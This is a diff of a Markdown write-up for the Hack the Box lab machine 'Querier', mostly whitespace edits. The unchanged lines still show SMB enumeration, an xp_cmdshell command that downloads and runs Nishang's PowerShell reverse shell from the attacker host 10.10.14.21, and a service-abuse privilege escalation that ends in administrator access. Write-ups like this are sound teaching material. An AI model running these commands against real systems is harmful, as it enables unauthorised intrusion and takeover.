@@ -1,8 +1,11 @@
 ---
+
 title: Querier
 tags: windows
 description: Write-up for Hack the Box - Querier
+
 ---
+
 ![image](assets/79376459-3605f180-7f28-11ea-88b3-5fe00f9322c2.png)
 
 ## Overview
@@ -44,13 +47,13 @@ smbclient -L //10.10.10.125 -N
 ```
 
 ```
-[+] IP: 10.10.10.125:445	Name: querier                                           
-	Disk                                                  	Permissions
-	----                                                  	-----------
-	ADMIN$                                            	NO ACCESS
-	C$                                                	NO ACCESS
-	IPC$                                              	READ ONLY
-	Reports                                           	READ ONLY
+[+] IP: 10.10.10.125:445    Name: querier                                           
+    Disk                                                      Permissions
+    ----                                                      -----------
+    ADMIN$                                                NO ACCESS
+    C$                                                    NO ACCESS
+    IPC$                                                  READ ONLY
+    Reports                                               READ ONLY
 ```
 
 ## Steps (user)
@@ -171,9 +174,7 @@ EXEC xp_cmdshell 'ping -n 1 10.10.14.21'
 
 I received a ping from the target which confirmed that I was able to run commands and communicate outbound to my box.
 
-
 ![image](assets/84849500-6c90e300-b023-11ea-8580-587023033d1d.png)
-
 
 Nishang's Invoke-powerShellTcp was copied to my local working directory
 
@@ -192,6 +193,7 @@ RECONFIGURE;
 
 EXEC xp_cmdshell 'powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString("""http://10.10.14.21/Invoke-PowerShellTcp.ps1""");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.21 -Port 4200"'
 ```
+
 I received a callback and shell as user mssql-svc
 
 ![image](assets/84615503-332b6c80-ae97-11ea-9d98-39abc79c8442.png)
@@ -269,7 +271,3 @@ invoke-serviceabuse -name 'UsoSvc' -force -command 'cmd /c reg add HKLM\SOFTWARE
 And I could establish a connection via evil-winrm with the mssql-svc account with full administrator access.
 
 ![image](assets/84964416-0e730700-b0da-11ea-91c4-315c2ee991a4.png)
-
-
-
-
